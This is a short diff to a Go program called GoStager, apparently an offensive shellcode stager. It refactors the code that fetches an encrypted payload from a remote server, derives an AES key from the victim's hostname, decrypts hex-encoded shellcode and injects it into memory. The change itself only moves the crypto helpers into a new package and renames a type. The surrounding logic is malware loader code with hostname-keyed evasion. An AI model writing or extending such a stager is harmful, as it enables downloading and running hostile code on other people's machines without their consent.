@@ -1,6 +1,7 @@
 package main
 
 import (
+	"GoStager/cmd/cryptoUtil"
 	"GoStager/cmd/util"
 	_ "embed"
 	b64 "encoding/base64"
@@ -17,9 +18,10 @@ import (
 
 //go:embed conf.txt
 var t string
+
 var (
 	body       []byte
-	initChecks util.InitChecks
+	initChecks util.InitialChecks
 )
 
 func main() {
@@ -40,8 +42,8 @@ func main() {
 		sleep(t)
 		body = request("", conf)
 	}
-	key := util.GenerateKey(initChecks.Hostname, 32)
-	hexSc, _ := util.DecodeAES(body, []byte(key))
+	key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
+	hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
 	shellcode, _ := hex.DecodeString(string(hexSc))
 	//inject the shellcode
 	inject(shellcode)
